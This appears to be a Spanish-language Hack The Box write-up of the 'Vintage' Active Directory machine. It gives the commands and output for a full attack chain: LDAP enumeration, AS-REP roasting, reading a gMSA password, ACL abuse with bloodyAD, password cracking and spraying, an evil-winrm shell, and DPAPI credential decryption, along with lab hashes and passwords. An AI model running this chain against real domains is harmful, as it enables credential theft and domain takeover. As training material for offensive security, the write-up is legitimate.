---
title: Vintage - Hard (HTB)
permalink: /Vintage-HTB-Writeup/
tags:
  - "Windows"
  - "Hard"
  - "LDAP Enumeration" 
  - "BloodHound"
  - "Pre-Win 2k Compatibility Enumeration"
  - "PassTheTicket"
  - "ACL Rights"
  - "ReadGMSAPassword"
  - "gMSA Abuse"
  - "AddSelf"
  - "GenericWrite"
  - "GenericAll"
  - "AS-REP Roast"
  - "Hash Cracking"
  - "Kerberos"
  - "DPAPI Abuse"
  - "RBCD"
  - "S4U2Self"
  - "S4U2Proxy"
  - "DC Sync"
categories:
  - "writeup"
  - "hacking"
  - "hackthebox"
  - "active directory"
toc: true
toc_label: Topics
toc_sticky: true
sidebar:
  - main
seo_tittle: Vintage - Hard (HTB)
seo_description: Practica enumeración de servicios antiguos dentro de un entorno controlado de Active Directory, explota diversos ataques avanzados hasta obtener control total del dominio.
excerpt: Practica enumeración de servicios antiguos dentro de un entorno controlado de Active Directory, explota diversos ataques avanzados hasta obtener control total del dominio.
header:
  overlay_image: /assets/images/headers/vintage-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/vintage-hackthebox.jpg
---


![image-center](/assets/images/posts/vintage-hackthebox.png)
{: .align-center}

**Habilidades:** LDAP Enumeration, Domain Analysis, Pre-Windows 2000 Compatibility Access Enumeration - `pre2k`, PassTheTicket, Abusing ACL - `ReadGMSAPassword` Rights, Abusing ACL - `AddSelf` and `GenericWrite` Rights, Abusing ACL - `GenericAll` Rights, AS-REP Roast, Hash Cracking using `john`, Kerberos Client Configuration, PassTheTicket over WinRM - `evil-winrm`, Abusing DPAPI Secrets - Master Key Extraction + Credential File Decryption, Abusing Resource Based Constrained Delegation (RBCD) + S4U2Self and S4U2Proxy - Getting Service Ticket, (Extra) DC Sync - Dumping NT Hashes
{: .notice--primary}

# Introducción

Vintage es una máquina Windows de dificultad `Hard` en HTB donde nos enfrentamos a un entorno de Active Directory. Este entorno posee una configuración particular debido a que debemos enumerar servicios antiguos para conseguir credenciales para un equipo dentro del dominio. Aprenderemos a axplotar derechos DACL y abusar de la delegación `kerberos` para elevar nuestros privilegios y vencer Vintage.  

En este escenario se nos proporcionan unas credenciales de un usuario del dominio, que son las siguientes: `P.Rosa`:`Rosaisbest123`
<br>

# Reconocimiento
---
Enviaremos una traza ICMP para verificar que la máquina se encuentre activa

~~~ bash
ping 10.10.11.45 -c 1                                                                                                                      
PING 10.10.11.45 (10.10.11.45) 56(84) bytes of data.
64 bytes from 10.10.11.45: icmp_seq=1 ttl=127 time=247 ms

--- 10.10.11.45 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 247.083/247.083/247.083/0.000 ms
~~~


## Nmap Scanning

Comenzaremos la fase de reconocimiento con un escaneo de puertos abiertos, como acostumbramos, primeramente será el protocolo TCP

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.45 -oG allPorts    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-21 12:23 EDT
Nmap scan report for 10.10.11.45
Host is up (0.16s latency).
Not shown: 65516 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49348/tcp open  unknown
49664/tcp open  unknown
49667/tcp open  unknown
49674/tcp open  unknown
49685/tcp open  unknown
50155/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 39.87 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**, ruidoso en la red
- `-n`: No aplicar **resolución DNS**
- `-sS`: Modo de **escaneo TCP SYN**, que no concluye la conexión, hace el escaneo más ágil y sigiloso
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grep`, útil para filtrar con expresiones regulares
- `-v`: Ver el progreso del escaneo en tiempo real

Haremos un segundo escaneo sobre los puertos que detectamos, la finalidad de este segundo escaneo es identificar la versión y servicio que ejecuta cada puerto

~~~ bash
nmap -p 53,88,135,139,389,445,464,636,3268,3269,5985,9389,49664,49668,49674,49685,53015,60065,61970 -sVC 10.10.11.45 -oN services                 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-21 12:30 EDT
Nmap scan report for 10.10.11.45
Host is up (0.16s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-21 16:30:22Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
636/tcp   open     tcpwrapped
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open     mc-nmf        .NET Message Framing
49664/tcp open     msrpc         Microsoft Windows RPC
49668/tcp filtered unknown
49674/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49685/tcp open     msrpc         Microsoft Windows RPC
53015/tcp filtered unknown
60065/tcp filtered unknown
61970/tcp filtered unknown
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-03-21T16:31:17
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 109.46 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

Podemos notar por la cantidad de servicios expuestos, que muy posiblemente estamos frente a un controlador de dominio. Esto lo podemos saber porque vemos servicios como `DNS`, `kerberos`, `ldap` o `smb`. Además podremos ver un dominio llamado `vintage.htb`, lo agregaremos al archivo `/etc/hosts` haciendo referencia al a IP de la máquina

~~~ bash
cat /etc/hosts | grep vintage.htb
10.10.11.45 vintage.htb DC01.vintage.htb
~~~


## (Posible) RPC Enumeration 

Como vemos que los puertos que usa RPC se encuentran abiertos, lo primero que podemos intentar es abrir una sesión sin proporcionar credenciales para ver si podemos enumerar información del dominio inclusive a través de otros protocolos como `smb` o `ldap`. Aprovecharemos las credenciales proporcionadas en la descripción de la máquina para intentar enumerar usuarios del dominio

~~~ bash
rpcclient -U "" -N 10.10.11.45 -c 'enumdomusers'
Cannot connect to server.  Error was NT_STATUS_NOT_SUPPORTED

rpcclient -U "P.Rosa%Rosaisbest123" -N 10.10.11.45 -c 'enumdomusers'
Cannot connect to server.  Error was NT_STATUS_NOT_SUPPORTED
~~~

Sin embargo no podremos conectarnos debido a que el servidor no admite el uso del protocolo RPC para al menos esta cuenta de usuario


## (Posible) SMB Enumeration

Si hacemos uso del protocolo `smb` para conectarnos al DC tampoco tendremos éxito, con y sin credenciales
 
~~~ bash
smbclient -L 10.10.11.45 -U ""                    
session setup failed: NT_STATUS_NOT_SUPPORTED

smbclient -L 10.10.11.45 -U "P.Rosa:Rosaisbest123"
session setup failed: NT_STATUS_NOT_SUPPORTED
~~~

> El error `session setup failed: NT_STATUS_NOT_SUPPORTED` indica que el Domain Controller no soporta la versión de SMB que estamos intentando utilizar
{: .notice--danger}


## LDAP Enumeration

Utilizaremos las credenciales proporcionadas para enumerar información del dominio a través del protocolo LDAP. Haremos uso de un tratamiento de la salida de la consola para filtrar por lo que nos interesa, en este caso, usuarios del dominio

~~~ bash
ldapsearch -H ldap://10.10.11.45 -D 'P.Rosa@vintage.htb' -w 'Rosaisbest123' -b 'DC=vintage,DC=htb' "(objectClass=user)" sAMAccountName | grep sAMAccountName | awk '{print $2}' FS=': ' | grep -v "sAMAccountName" > users.txt
~~~


## (Posible) AS-REP Roast

Es posible intentar hacer este ataque ya que si consultamos un TGT para el listado de usuarios, obtendremos los de `svc_sql` y `svc_ark`

~~~ bash
GetNPUsers.py vintage.htb/ -usersfile users.txt    

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

$krb5asrep$23$svc_ldap@VINTAGE.HTB:be43c37b2957df71308b8fb9257a96ee$e70374fae2e38740139859c17756daf8003830e9b7955096060491b361c88baaea2c50de2d3aa1847c711a5a4cd57f0ef3b9333d8b649ce529437813ae66722f95986ac006f83c93b81913d1e2fe0fde993f234cd1175832ab86770dbfb749fcbe2d8b1fa52f162041733e243abeec40dade36af9b66496a584805f62e15edcca3a572ace12ca223f0ca11f18390ca7a7c5883f00fa964f0f4abf23e9569b1208ba494228857e50a77009254721ec581b31f2df04fa10040fc067a2570607ec6fc40468cbeb274dfa7624b4e8b38a2b664f2d88dc2f8d6552f203f94811821d647609477f5a3e9fa7d4d
$krb5asrep$23$svc_ark@VINTAGE.HTB:28297959627842dc77ac662cde0103a7$bd13fb6b981cecb0c4053425ae0d5e1c1667eb3889e5b293126eb8b3b11da2bbf61810b750e6d272b07cbbe5390823fc966f314617888924b26a1923acfbbb90673283f0fcbb4bad05e2aa5a1fb96ebae41d86fd0d0bc0b973e271d9127ab0ba4f98b4d3a3d704faf9fd1fca6d8fae0782994d70c23ff0e97953398f9b99ce5897ef4a9e94aa8ac34915c7fef20122c086814876e080f3c2964be39f2b6620c61edba5797ed2b309dfb6775958e482bf96a50ebc30615593f656fc71215b8463d8e13dd5e0d79f2d221ee17912e5daa971c4dcb2c5abdee572567508521f480b5373f0cca57e91b533a3
~~~

Si intentamos crackear estos hashes, no podremos debido a que muy probablemente  estas cuentas poseen una contraseña robusta o son cuentas `gMSA` (Group Managed Service Accounts) o similar


## DC Enumeration - BloodHound Analysis

Recolectaremos información del dominio para representarla en `bloodhound`, así podremos identificar vías potenciales para escalar privilegios

~~~ bash
bloodhound-python -d vintage.htb -c All -ns 10.10.11.45 --zip -u 'P.Rosa' -p 'Rosaisbest123'
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: vintage.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.vintage.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.vintage.htb
INFO: Found 16 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: FS01.vintage.htb
INFO: Querying computer: dc01.vintage.htb
WARNING: Could not resolve: FS01.vintage.htb: The resolution lifetime expired after 3.102 seconds: Server Do53:10.10.11.45@53 answered The DNS operation timed out.
INFO: Done in 00M 42S
INFO: Compressing output into 20250321133254_bloodhound.zip

# Iniciamos la bsae de datos de grafos y bloodhound
sudo neo4j console
bloodhound &>/dev/null & disown
~~~

Si buscamos computadoras dentro del dominio, encontraremos un equipo llamado `FS01`. Si exploramos a los grupos a los que pertenece este objeto dentro del dominio, podemos ver que este equipo forma parte del grupo `Pre-Windows 2000 Compatible Access`

![image-center](/assets/images/posts/vintage-bloodhound-1.png)
{: .align-center}

> La compatibilidad con versiones anteriores a Windows 2000, permite autenticación NTLM en vez de `kerberos`, contrario a la prioridad en sistemas más actuales que usan `kerberos` por encima de `NTLM` siempre y cuando `kerberos` esté disponible
{: .notice--danger}


## Pre-Windows 2k Compatibility Enumeration

Recopilaremos información de la configuración heredada de `Pre-Windows 2000 Compatibility Access` con el propósito de encontrar configuraciones antiguas y explotables. En este ejemplo está intentando confirmar usuarios válidos dentro de la computadora `FS01`.

Para esto usaremos la herramienta `pre2k`, la instalaremos de la siguiente forma

~~~ bash
git clone https://github.com/garrettfoster13/pre2k
python3 -m venv pre2k_env
source pre2k_env/bin/activate
cd pre2k
pip install .
~~~

Con el entorno virtual preparado, buscaremos cuentas que tengan configurada la compatibilidad con versiones anteriores a Windows 2000

~~~ bash
pre2k unauth -d vintage.htb -dc-ip 10.10.11.45 -save -inputfile users.txt

                                ___    __         
                              /'___`\ /\ \        
 _____   _ __    __          /\_\ /\ \\ \ \/'\    
/\ '__`\/\`'__\/'__`\ _______\/_/// /__\ \ , <    
\ \ \L\ \ \ \//\  __//\______\  // /_\ \\ \ \\`\  
 \ \ ,__/\ \_\\ \____\/______/ /\______/ \ \_\ \_\
  \ \ \/  \/_/ \/____/         \/_____/   \/_/\/_/
   \ \_\                                      v3.1    
    \/_/                                          
                                            @unsigned_sh0rt
                                            @Tw1sm          

[13:55:57] INFO     Testing started at 2025-03-21 13:55:57
[13:55:57] INFO     Using 10 threads                 
[13:55:58] INFO     VALID CREDENTIALS: vintage.htb\FS01$:fs01
[13:55:58] INFO     Saving ticket in FS01$.ccache
~~~

En este caso encontramos una cuenta `FS01$` con una contraseña predecible, entonces obtuvimos el TGT correspondiente
<br>


# Intrusión / Explotación
---
## PassTheTicket

Como tenemos un ticket `kerberos` almacenado en caché (`.ccache`). Lo usaremos para autenticarnos en `ldap`, ya que es un protocolo que podremos utilizar

~~~ bash
export KRB5CCNAME=FS01\$.ccache

nxc smb 10.10.11.45 -k --use-kcache 
SMB         10.10.11.45     445    10.10.11.45      [*]  x64 (name:10.10.11.45) (domain:10.10.11.45) (signing:True) (SMBv1:False)
SMB         10.10.11.45     445    10.10.11.45      [-] 10.10.11.45\ from ccache KDC_ERR_WRONG_REALM 

nxc ldap 10.10.11.45 -k --use-kcache
LDAP        10.10.11.45     389    dc01.vintage.htb [*]  x64 (name:dc01.vintage.htb) (domain:vintage.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.45     389    dc01.vintage.htb [+] vintage.htb\FS01$ from ccache
~~~


## Abusing ACL - `ReadGMSAPassword` Rights

Si enumeramos a través de `ldap`, los usuarios, podemos notar que la cuenta `gmsa` forma parte del grupo `Manage Service Accounts`.

Estas son un tipo de cuenta de dominio gestionadas por el propio Domain Controller, se utilizan para ejecutar servicios en varios servidores sin tener que administrar manualmente las contraseñas

![image-center](/assets/images/posts/vintage-bloodhound-2.png)
{: .align-center}

Podemos verificar la cuenta `gMSA01$` ejecutando el siguiente comando. Usaremos el ticket cargado previamente para extraer el hash `NT` de la cuenta `gMSA01$`

~~~ bash
ldapsearch -H ldap://10.10.11.45 -D 'P.Rosa@vintage.htb' -w 'Rosaisbest123' -b 'DC=vintage,DC=htb' "(objectClass=user)" | grep dn -B 2

# gMSA01, Managed Service Accounts, vintage.htb
dn: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb

# Alternativa con bloodyAD
bloodyAD --host dc01.vintage.htb -d vintage.htb -k get object 'gMSA01$' --attr distinguishedName                    

distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
~~~

Ahora empleando el ticket, tendremos permisos para ver el hash `NT` (NTLM) de la cuenta `gMSA01$`

~~~ bash
# Utilizando gMSA Dumper (Me dió algunos problemas)
python3 gMSADumper.py -d vintage.htb -k 

# Utilizando bloodyAD
bloodyAD --host dc01.vintage.htb -d vintage.htb -k get object 'gMSA01$' --attr msDS-ManagedPassword

distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:b3a15bbdfb1c53238d4b50ea2c4d1178
msDS-ManagedPassword.B64ENCODED: cAPhluwn4ijHTUTo7liDUp19VWhIi9/YDwdTpCWVnKNzxHWm2Hl39sN8YUq3hoDfBcLp6S6QcJOnXZ426tWrk0ztluGpZlr3eWU9i6Uwgkaxkvb1ebvy6afUR+mRvtftwY1Vnr5IBKQyLT6ne3BEfEXR5P5iBy2z8brRd3lBHsDrKHNsM+Yd/OOlHS/e1gMiDkEKqZ4dyEakGx5TYviQxGH52ltp1KqT+Ls862fRRlEzwN03oCzkLYg24jvJW/2eK0aXceMgol7J4sFBY0/zAPwEJUg1PZsaqV43xWUrVl79xfcSbyeYKL0e8bKhdxNzdxPlsBcLbFmrdRdlKvE3WQ==
~~~

Ahora tendremos la capacidad de autenticarnos como `gMSA01$` en el dominio, podemos obtener un TGT válido y usar autenticación `kerberos`

~~~ bash
getTGT.py vintage.htb/'gMSA01$' -hashes :b3a15bbdfb1c53238d4b50ea2c4d1178 -dc-ip 10.10.11.45      
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Saving ticket in gMSA01$.ccache
~~~


## Abusing ACL - `AddSelf` and `GenericWrite` Rights

La cuenta `gMSA01$` tiene la capacidad de agregarse a sí misma al grupo `Service Managers` utilizando los derechos `AddSelf`, además de poseer derechos `GenericWrite`, lo que permite editar atributos del grupo en cuestión

![image-center](/assets/images/posts/vintage-bloodhound-3.png)
{: .align-center}
 
Utilizando el ticket, agregaremos a la cuenta `gMSA01$` al grupo `Service Managers` utilizando `bloodyAD`

~~~ bash
export KRB5CCNAME=gMSA01\$.ccache

bloodyAD --host dc01.vintage.htb -d vintage.htb -k add groupMember "CN=SERVICEMANAGERS,OU=PRE-MIGRATION,DC=VINTAGE,DC=HTB" 'gMSA01$'

[+] gMSA01$ added to CN=SERVICEMANAGERS,OU=PRE-MIGRATION,DC=VINTAGE,DC=HTB
~~~

Con el siguiente comando podremos comprobar que el usuario `gMSA01$` ha sido agregado al grupo `Service Managers`

~~~ bash
bloodyAD --host "dc01.vintage.htb" -d "vintage.htb" -k get object "CN=SERVICEMANAGERS,OU=PRE-MIGRATION,DC=VINTAGE,DC=HTB" --attr member
~~~


## Abusing ACL - `GenericAll` Rights

El grupo `SERVICEMANAGERS` posee derechos `GenericAll` sobre las cuentas `svc_ark`, `svc_sql` y `svc_ldap`. Con los permisos actuales, podremos activar la cuenta del usuario `svc_sql`, la cual se encuentra deshabilitada

![image-center](/assets/images/posts/vintage-bloodhound-4.png)

Emplearemos el siguiente comando para quitar el atributo `ACCOUNTDISABLE` a la cuenta `svc_sql`. Esto activará la cuenta de servicio para poder utilizarla en futuros ataques

~~~ bash
bloodyAD --host "dc01.vintage.htb" -d "vintage.htb" --kerberos --dc-ip 10.10.11.45 -u 'GMSA01$' -k remove uac SVC_SQL -f ACCOUNTDISABLE

[-] ['ACCOUNTDISABLE'] property flags removed from SVC_SQL's userAccountControl
~~~

> Si usamos esta cuenta por demasiado tiempo, considera ejecutar este comando para activarla cuando loa necesites (recuerda tener los privilegios suficientes)
{: .notice--danger}


## AS-REP Roast

Además, haremos que la cuenta `svc_sql` sea vulnerable a `AS-REP Roast` añadiendo la propiedad de `DONT_REQUIRE_PREAUTH`

~~~ bash
bloodyAD --host "dc01.vintage.htb" -d "vintage.htb" --kerberos --dc-ip 10.10.11.45 -u 'GMSA01$' -k add uac SVC_SQL -f DONT_REQ_PREAUTH

[-] ['DONT_REQ_PREAUTH'] property flags added to SVC_SQL's userAccountControl
~~~

Obtendremos el TGT correspondiente a la cuenta `svc_sql`, guardaremos este hash en un archivo para intentar crackearlo con `john` o `hashcat`

~~~ bash
GetNPUsers.py vintage.htb/ -usersfile users.txt                                                                                       
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User gMSA01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User FS01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User M.Rossi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User R.Verdi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Bianchi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User G.Viola doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User C.Neri doesn't have UF_DONT_REQUIRE_PREAUTH set
~~~


## Hash Cracking

Una vez asignamos el atributo `DONT_REQ_PREAUTH`, lanzamos el ataque AS-REP Roast para obtener el TGT de la cuenta `svc_sql`

~~~ bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Zer0the0ne       ($krb5asrep$svc_sql@VINTAGE.HTB)     
1g 0:00:00:15 DONE (2025-04-25 15:13) 0.06389g/s 916533p/s 982881c/s 982881C/s !!12Honey..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
~~~


## Kerberos Password Spraying

Usaremos esta contraseña para hacer `Password Spraying` y así identificar usuarios que puedan autenticarse con este credencial

~~~ bash
kerbrute passwordspray --dc 10.10.11.45 -d vintage.htb users.txt Zer0the0ne 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 04/25/25 - Ronnie Flathers @ropnop

2025/04/25 15:16:34 >  Using KDC(s):
2025/04/25 15:16:34 >  	10.10.11.45:88

2025/04/25 15:16:35 >  [+] VALID LOGIN:	C.Neri@vintage.htb:Zer0the0ne
2025/04/25 15:16:35 >  [+] VALID LOGIN:	svc_sql@vintage.htb:Zer0the0ne
2025/04/25 15:16:35 >  Done! Tested 17 logins (2 successes) in 1.369 seconds
~~~


## Kerberos Client Setup

Si intentamos ingresar a través de `winrm` con las credenciales obtenidas, no tendremos éxito. Debemos configurar el archivo de configuración de `kerberos` para que nuestra máquina encuentre el KDC para una autenticación empleando `kerberos`

Primeramente obtendremos un TGT para el usuario `C.Neri`

~~~ bash
getTGT.py vintage.htb/C.Neri:Zer0the0ne -dc-ip 10.10.11.45
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Saving ticket in C.Neri.ccache
~~~

Ahora configuramos el archivo `/etc/krb5.conf` para utilizar una configuración del reino `kerberos` correctamente. De esta forma podremos hacer referencia a la máquina víctima como un KDC

~~~ bash
cat /etc/krb5.conf

[libdefaults]
  default_realm = VINTAGE.HTB
  dns_lookup_realm = false
  dns_lookup_kdc = false

[realms]
  VINTAGE.HTB = {
    kdc = vintage.htb
  }
[domain_realm]
        vintage.htb = VINTAGE.HTB
        .vintage.htb = VINTAGE.HTB
~~~


## Shell as `C.Neri`

Con la configuración preparada, utilizaremos `evil-winrm` para conectarnos a la máquina como el usuario `c.neri`

~~~ bash
evil-winrm -i DC01.vintage.htb -r vintage.htb
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\C.Neri\Documents> whoami

vintage\c.neri
~~~

- `-i`: Dirección IP o hostname del DC
- `-r`: Reino `Kerberos` a usar

Ahora ya podremos ver la flag del usuario no privilegiado

~~~ bash
*Evil-WinRM* PS C:\Users\C.Neri\Documents> type ..\Desktop\user.txt 
6ed...
~~~
<br>


# Escalada de Privilegios
---
## Abusing DPAPI Secrets (DPAPI Master Key Extraction + Credential Decryption)

Luego de enumerar la máquina, encontraremos archivos relacionados con la API de Protección de datos (DPAPI). DPAPI es un componente de Windows que permite que aplicaciones gestionen credenciales. 

Para abusar de este componente, necesitaremos tener acceso a los archivos de credenciales, que normalmente se guardan en las siguientes rutas:

- `C:\Users\$USER\AppData\Local\Microsoft\Credentials\`
- `C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\`

Además debemos saber que para descifrar estos archivos necesitamos una clave simétrica almacenada comúnmente en la siguiente ruta

~~~ text
C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID
~~~

Esta técnica nos permitirá ver credenciales en texto claro y poder movernos lateralmente dentro del dominio, en el siguiente artículo se profundiza más acercad de este concepto.

- https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html?highlight=DPAPI#dpapi

### Finding DPAPI Credential Files

Dentro de las rutas habituales en las que podemos encontrar archivos de credenciales, los cuales debemos desencriptar con una clave maestra

~~~ bash
*Evil-WinRM* PS C:\Users\C.Neri\Documents> dir C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials -Force


    Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   5:08 PM            430 C4BB96844A5C9DD45D5B6A9859252BA6
~~~

### Finding DPAPI Master Key

Para desencriptar este archivo de credencial, necesitamos ubicar la clave maestra, la podremos encontrar en el siguiente directorio

~~~ bash
*Evil-WinRM* PS C:\Users\C.Neri\Documents> cd C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\
*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> dir -Force 


    Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   1:17 PM            740 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
-a-hs-          6/7/2024   1:17 PM            740 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
-a-hs-          6/7/2024   1:17 PM            904 BK-VINTAGE
-a-hs-          6/7/2024   1:17 PM             24 Preferred
~~~

Descargamos las `Master Keys` y probaremos usando ambas para desencriptar el archivo de credenciales. 

>Necesitaremos hacer un pequeño tratamiento con `powershell` para quitar los atributos `hidden` y `system`, lo que nos dará conflictos a la hora de intentar descargarlos con `evil-winrm`
{: .notice--danger}

Finalmente la clave maestra que necesitamos será `99cf41a3-a552-4cf7-a8d7-aca2d6f7339b`

~~~ bash
*Evil-WinRM* PS C:\Users\C.Neri\Documents> attrib -h -s C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b

*Evil-WinRM* PS C:\Users\C.Neri\Documents> attrib -h -s C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\C4BB96844A5C9DD45D5B6A9859252BA6
~~~

Ahora que quitamos los atributos que nos impiden descargar los archivos, procederemos a descargarlos en nuestra máquina atacante usando el comando `download`

~~~
*Evil-WinRM* PS C:\Users\C.Neri\Documents> download C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\C4BB96844A5C9DD45D5B6A9859252BA6

*Evil-WinRM* PS C:\Users\C.Neri\Documents> download C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
~~~

### Decrypting DPAPI Master Key

Necesitamos el SID del usuario actual, lo podemos obtener desde `BloodHound`
 o ejecutando lo siguiente 

~~~ bash
*Evil-WinRM* PS C:\Users\C.Neri\Documents> whoami /user 

USER INFORMATION
----------------

User Name      SID
============== ==============================================
vintage\c.neri S-1-5-21-4024337825-2033394866-2055507597-1115
~~~

Usamos el archivo de la `Master Key`, la contraseña del usuario `c.neri` y su SID para desencriptar la clave maestra que requerimos posteriormente para descifrar el archivo de credencial

~~~ bash
impacket-dpapi masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
~~~

### Decrypting DPAPI Credentials

Ahora procedemos a desencriptar el archivo de credenciales para el usuario `c.neri_adm`, utilizando la clave desencriptada que acabamos de obtener

~~~ bash
impacket-dpapi credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[CREDENTIAL]
LastWritten : 2024-06-07 15:08:23
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
